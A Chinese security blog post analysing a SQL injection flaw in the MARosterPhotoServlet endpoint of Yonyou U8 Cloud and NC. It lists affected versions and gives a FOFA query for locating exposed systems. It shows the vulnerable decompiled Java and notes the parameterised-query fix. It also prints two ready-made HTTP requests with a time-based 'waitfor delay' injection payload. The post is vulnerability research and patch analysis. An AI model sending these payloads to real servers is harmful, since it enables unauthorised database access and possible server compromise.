---
title: "用友U8 Cloud MARosterPhotoServlet SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-u8cloud-MARosterPhotoServlet-sqli.html
asset_dir: assets/用友u8-cloud-marosterphotoservlet-sql注入漏洞
---

# 用友U8 Cloud MARosterPhotoServlet SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/5 18:26
- 1041浏览
- [0评论](#comment)
- 48分钟阅读

深入探索

Cloud

server

软件

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")U8 Cloud MARosterPhotoServlet 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp

# fofa语法

> `app="用友-U8-Cloud"`

# 漏洞分析

深入探索

漏洞修复方案

计算机安全

安全研究报告

本来是根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")通告可知SQL注入点在 MARosterPhotoServlet 接口

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-001-79815115635f.webp)](https://image.mrxn.net/d5c8d7f33f014d05980bec12194da4a4.webp)

直接看 MARosterPhotoServlet 的实现

```
package com.yonyou.ma.roster.servlet;

import com.yonyou.ma.roster.module.RosterPhoto;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import nc.bcmanage.bs.IBusiCenterManageService;
import nc.bcmanage.vo.BusiCenterVO;
import nc.bs.dao.BaseDAO;
import nc.bs.framework.adaptor.IHttpServletAdaptor;
import nc.bs.framework.common.InvocationInfoProxy;
import nc.bs.framework.common.NCLocator;
import nc.bs.framework.comn.NetStreamContext;
import nc.bs.framework.server.ISecurityTokenCallback;
import nc.bs.logging.Logger;
import nc.bs.uap.lock.PKLock;
import nc.jdbc.framework.processor.BeanProcessor;
import nc.jdbc.framework.processor.ResultSetProcessor;
import nc.login.bs.LoginVerifyBean;
import nc.vo.pub.BusinessException;

public class MARosterPhotoServlet
extends HttpServlet
implements IHttpServletAdaptor {
    private static final long serialVersionUID = 1L;

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doAction(req, resp);
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doAction(req, resp);
    }

    public void doAction(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String photoId = request.getHeader("photoId");
        String type = request.getHeader("type");
        if (photoId != null) {
            try {
                String accountcode = request.getHeader("accountcode");
                if (accountcode != null && !accountcode.trim().equals("")) {
                    IBusiCenterManageService bcservice = (IBusiCenterManageService)NCLocator.getInstance().lookup(IBusiCenterManageService.class);
                    BusiCenterVO centervo = bcservice.getBusiCenterByCode(accountcode);
                    InvocationInfoProxy.getInstance().setUserDataSource(centervo.getDataSourceName());
                }
                BaseDAO dao = new BaseDAO();
                if (type.equals("pid")) {
                    String sql = "select bd_psndoc.photo, sm_user.cuserid userid from bd_psndoc  left join sm_user on sm_user.pk_psndoc = bd_psndoc.pk_psndoc  where bd_psndoc.pk_psndoc = '" + photoId + "'";
                    RosterPhoto rosterPhoto = (RosterPhoto)dao.executeQuery(sql, (ResultSetProcessor)new BeanProcessor(RosterPhoto.class));
                    if (rosterPhoto.getUserid() != null && !"".equals(rosterPhoto.getUserid().trim())) {
                        response.setHeader("uid", rosterPhoto.getUserid());
                    }
                    response.getOutputStream().write(rosterPhoto.getPhoto() == null ? "".getBytes() : rosterPhoto.getPhoto());
                } else {
                    String getpidsql = "select t.photo photo, u.cuserid userid from sm_user u  left join  bd_psndoc t on t.pk_psndoc = u.pk_psndoc where u.cuserid = '" + photoId + "'";
                    RosterPhoto rosterPhoto = (RosterPhoto)dao.executeQuery(getpidsql, (ResultSetProcessor)new BeanProcessor(RosterPhoto.class));
                    if (rosterPhoto.getUserid() != null && !"".equals(rosterPhoto.getUserid().trim())) {
                        response.setHeader("uid", rosterPhoto.getUserid());
                    }
                    response.getOutputStream().write(rosterPhoto.getPhoto() == null ? "".getBytes() : rosterPhoto.getPhoto());
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
```

通过 header 获取 photoId 和 type ，当 photoId 不等于null时，进入处理逻辑，无论 type 是否等于 pid 都会将 photoId 直接拼接进SQL语句中执行，造成SQL注入漏洞。

调试也可以看到SQL语句传入直接拼接到SQL语句中，最终调用 (RosterPhoto)dao.executeQuery 执行拼接后的SQL语句，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-002-bbad7f0f2be5.webp)](https://image.mrxn.net/93faafeee7fd4f6988d1b95e760a821f.webp)

根据补丁对比查看可知，修复方式是参数化+预编译处理来预防SQL注入漏洞。

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-003-95cf59e9329b.webp)](https://image.mrxn.net/afb2de0cde0b4a1392ebbab6f75ba7ea.webp)

# 漏洞复现

漏洞利用示例

```
GET /servlet/~uap/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?pageId=login HTTP/1.0
Host: u8cloud.mrxn.net
accountcode: U8cloud
type: pid
photoId: 1';waitfor delay'0:0:4'-- Alks
```

[![用友U8 Cloud MARosterPhotoServlet SQL注入漏洞](images/img-004-71ffcbcf187f.webp)](https://image.mrxn.net/ca221ba2b1854d0e854651292cd20c8e.webp)

成功延时 4 秒

这个漏洞其实还影响用友NC系列

```
GET /servlet/~pubapp/com.yonyou.ma.roster.servlet.MARosterPhotoServlet HTTP/1.0
Host: nc.mrxn.net
accountcode: U8cloud
type: pid
photoId: 1';waitfor delay'0:0:4'-- Alks
```

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=398`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
